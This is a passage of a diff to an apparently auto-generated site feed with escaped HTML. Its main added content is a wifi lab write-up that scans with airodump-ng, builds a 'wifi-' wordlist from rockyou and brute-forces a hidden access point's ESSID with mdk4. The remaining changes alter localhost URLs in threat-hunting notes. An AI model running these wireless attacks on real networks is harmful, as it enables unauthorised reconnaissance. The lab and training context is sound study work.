+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;airodump-ng wlan0mon -w ~/wifi/scan --manufacturer --wps --band abg&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copy code&#34;
+    aria-label=&#34;Copy code&#34;
+    data-copied-label=&#34;Copied!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;h4&gt;04. What is the ESSID of the hidden AP (mac F0:9F:C2:6A:88:26)?&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;04-what-is-the-essid-of-the-hidden-ap-mac-f09fc26a8826&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#04-what-is-the-essid-of-the-hidden-ap-mac-f09fc26a8826&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;Prepare a wordlist with the common patterns &lt;code&gt;wifi-$words&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;cat /root/rockyou-top100000.txt | awk &amp;#39;{print &amp;#34;wifi-&amp;#34;$1}&amp;#39; &amp;gt; wifi.wordlist&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copy code&#34;
+    aria-label=&#34;Copy code&#34;
+    data-copied-label=&#34;Copied!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;ul&gt;
+&lt;li&gt;This wordlist will be use to brute force the wifi essids&lt;/li&gt;
+&lt;li&gt;Verify the generated list, which looks like the below listed example.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ less wifi.wordlist
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wifi-123456
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wifi-12345
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wifi-123456789
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wifi-12345678
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wifi-abc123
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wifi-nicole&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copy code&#34;
+    aria-label=&#34;Copy code&#34;
+    data-copied-label=&#34;Copied!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;ul&gt;
+&lt;li&gt;We can now use &lt;code&gt;mdk4&lt;/code&gt; to bruteforce the essid of the provided address.&lt;/li&gt;
+&lt;li&gt;First find the channel of the provided AP&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ airodump-ng wlan0mon&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copy code&#34;
+    aria-label=&#34;Copy code&#34;
+    data-copied-label=&#34;Copied!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;ul&gt;
+&lt;li&gt;We can see that it&amp;rsquo;s running in &lt;code&gt;channel 11&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;The below explains the options set for the program (refer to mdk4 man page)
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;p&lt;/code&gt; - SSID Probing and Bruteforcing&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-t&lt;/code&gt; - Set MAC address of target AP&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-f&lt;/code&gt; - Read SSIDs from file for bruteforcing hidden SSIDs&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;iwconfig wlan0mon channel &lt;span class=&#34;m&#34;&gt;11&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mdk4 wlan0mon p -t  F0:9F:C2:6A:88:26 -f ./wifi.wordlist&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copy code&#34;
+    aria-label=&#34;Copy code&#34;
+    data-copied-label=&#34;Copied!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/docs/02_platforms/wifi/assets/Pasted_image_20260222230339.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
 
       </description>
     </item>
     
     <item>
       <title>[02] Threat Actors</title>
-      <link>http://localhost:40231/docs/01_methodology/threat-hunting/02-threat-actors-landscape/</link>
+      <link>http://localhost:1313/docs/01_methodology/threat-hunting/02-threat-actors-landscape/</link>
       <pubDate>Wed, 18 Mar 2026 00:00:00 +0000</pubDate>
       
-      <guid>http://localhost:40231/docs/01_methodology/threat-hunting/02-threat-actors-landscape/</guid>
+      <guid>http://localhost:1313/docs/01_methodology/threat-hunting/02-threat-actors-landscape/</guid>
       <description>
         
         
@@ -5147,7 +5840,7 @@ The ARD solution presented in the above mentioned paper tackles all the problems
     &lt;a href=&#34;#21-adversary-classification&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;The threat actors can be categorized based on their motivations, skillsets and other attributes that they might have.  Typically we can think of a target and motivation, which will paint a picture about the nature of a threat actor.&lt;/p&gt;
 &lt;p&gt;These threat actors are strategic and methodical in executing their attack chain. According to &lt;a
     href=&#34;https://cloud.google.com/security/resources/insights/targeted-attack-lifecycle&#34;target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Mandiant Targeted attack life cycle&lt;/a&gt;, these predictable sequence of event.&lt;br&gt;
-&lt;img src=&#34;http://localhost:40231/docs/01_methodology/threat-hunting/assets/Pasted_image_20260314145910.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;img src=&#34;http://localhost:1313/docs/01_methodology/threat-hunting/assets/Pasted_image_20260314145910.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
 &lt;h5&gt;2.1.1 Threat Actor Motivations &amp;amp; Objectives&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;211-threat-actor-motivations--objectives&#34;&gt;&lt;/span&gt;
     &lt;a href=&#34;#211-threat-actor-motivations--objectives&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h5&gt;&lt;ol&gt;
 &lt;li&gt;A threat actor may target an individual for reasons such as personal revenge, defamation, or financial gain.&lt;/li&gt;
@@ -5220,7 +5913,7 @@ The ARD solution presented in the above mentioned paper tackles all the problems
 &lt;p&gt;These actors are considered &lt;strong&gt;adversarial threat sources&lt;/strong&gt; in cybersecurity risk assessments such as those described in NIST Special Publication 800-30.&lt;/p&gt;
 &lt;p&gt;&lt;a
     href=&#34;https://evessio.s3.amazonaws.com/customer/8c4659ee-526a-4e9c-89dc-f6f4c3c1a789/event/626d2029-35a9-4ee1-a871-8f2e82ca8720/responses/80d534e2-ad36-4051-8947-3a047e6e350c/acc8ddcc-profile_62a34107590ad18b904b739d_Stages_of_a_Ransomware_Attack.pdf&#34;target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;DarkTrack Threat discovery&lt;/a&gt; defined the following stages of a Ransomware Attack which includes Initiation, Establish foothold &amp;amp; Beaconing (C2), Lateral Movement, Data Exfiltration, Data Encryption, Ransom, Clean up &amp;amp; Recovery, The Cycle Repeats.&lt;br&gt;
-&lt;img src=&#34;http://localhost:40231/docs/01_methodology/threat-hunting/assets/Pasted_image_20260314151116.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;img src=&#34;http://localhost:1313/docs/01_methodology/threat-hunting/assets/Pasted_image_20260314151116.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Research shows that 80% of ransomware victims that pay the ransom suffer a second attack, often in the hands of the same group. The only way to truly keep the attackers
 from striking again is to know the full scope of the attack, ensure the attacker is no longer in your environment, and use a technology that doesn&amp;rsquo;t look at connections
 and events on a one-off basis.&lt;/p&gt;
@@ -5307,7 +6000,7 @@ and events on a one-off basis.&lt;/p&gt;
 			&lt;/tr&gt;
 	&lt;/tbody&gt;
 &lt;/table&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:40231/docs/01_methodology/threat-hunting/assets/Pasted_image_20260314153921.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/docs/01_methodology/threat-hunting/assets/Pasted_image_20260314153921.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Hence we have to distinguish actor groups that that distinct TTPs, objectives or other patterns.&lt;/p&gt;
 
       </description>
@@ -5315,10 +6008,10 @@ and events on a one-off basis.&lt;/p&gt;
     
     <item>
       <title>[01] Threat Hunting Introduction</title>
-      <link>http://localhost:40231/docs/01_methodology/threat-hunting/01-threat-hunting-essentials/</link>
+      <link>http://localhost:1313/docs/01_methodology/threat-hunting/01-threat-hunting-essentials/</link>
       <pubDate>Sat, 14 Mar 2026 00:00:00 +0000</pubDate>
       
-      <guid>http://localhost:40231/docs/01_methodology/threat-hunting/01-threat-hunting-essentials/</guid>
+      <guid>http://localhost:1313/docs/01_methodology/threat-hunting/01-threat-hunting-essentials/</guid>
       <description>
         
         
@@ -5388,7 +6081,7 @@ Cyber threat hunting is the process of proactively searching for undetected thre
 &lt;ul&gt;
 &lt;li&gt;&lt;a
     href=&#34;https://www.crowdstrike.com/en-us/cybersecurity-101/threat-intelligence/threat-hunting/&#34;target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Crowdstrike Threat Hunting Process&lt;/a&gt;
-&lt;img src=&#34;http://localhost:40231/docs/01_methodology/threat-hunting/assets/Pasted_image_20260312231306.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;
+&lt;img src=&#34;http://localhost:1313/docs/01_methodology/threat-hunting/assets/Pasted_image_20260312231306.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;
 In a nutshell, the SOC Infrastructure will monitor for alters, triage information and classify them as Events (or) Incidents. Upon classification, an associated process will be triggered for instance an &amp;ldquo;Incident&amp;rdquo; will trigger an incident response process. Threat Hunting, however is a cyclic process, where it an organization is assumed breach. Upon a successful threat hunt, the identified threats will be submitted to the SOC, which will trigger an incident response if it meets the criteria for an Incident.&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;More or less, threat hunting is like looking for &lt;strong&gt;smoke before a fire&lt;/strong&gt;. Due to this nature, a threat hint doesn&amp;rsquo;t wait for an alert signals, instructions, alarms or event indicators of compromise, but rather questions everything form a hypothesis, and try to prove or disprove the original hypothesis.&lt;/p&gt;
@@ -5442,7 +6135,7 @@ These three parameters are mapped into 5 levels of maturity ranging gotm HMM0 (t
 			&lt;/tr&gt;
 	&lt;/tbody&gt;
 &lt;/table&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:40231/docs/01_methodology/threat-hunting/assets/Pasted_image_20260312234325.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/docs/01_methodology/threat-hunting/assets/Pasted_image_20260312234325.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;
 More or less, the workflow looks as shown below&lt;/p&gt;
 &lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
 
@@ -5516,7 +6209,7 @@ More or less, the workflow looks as shown below&lt;/p&gt;
 &lt;li&gt;&lt;a
     href=&#34;https://www.mitre.org/sites/default/files/2021-11/prs-19-3892-ttp-based-hunting.pdf&#34;target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;MITRE ATT&amp;amp;CK Based Hunting&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:40231/docs/01_methodology/threat-hunting/assets/Pasted_image_20260313000913.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/docs/01_methodology/threat-hunting/assets/Pasted_image_20260313000913.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;
 structured hunt. It is often triggered by the discovery of an indicator of compromise (IoC) in an organization’s system. Hunters then look for what caused the IoC and whether it is still at large in the network.&lt;/p&gt;
 &lt;h5&gt;1.5.2 Situational + Entity-Driven Threat Hunting&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;152-situational--entity-driven-threat-hunting&#34;&gt;&lt;/span&gt;
     &lt;a href=&#34;#152-situational--entity-driven-threat-hunting&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h5&gt;&lt;p&gt;A situational hunt is a response to an organization’s unique situation. It is usually driven by the results of an internal &lt;a
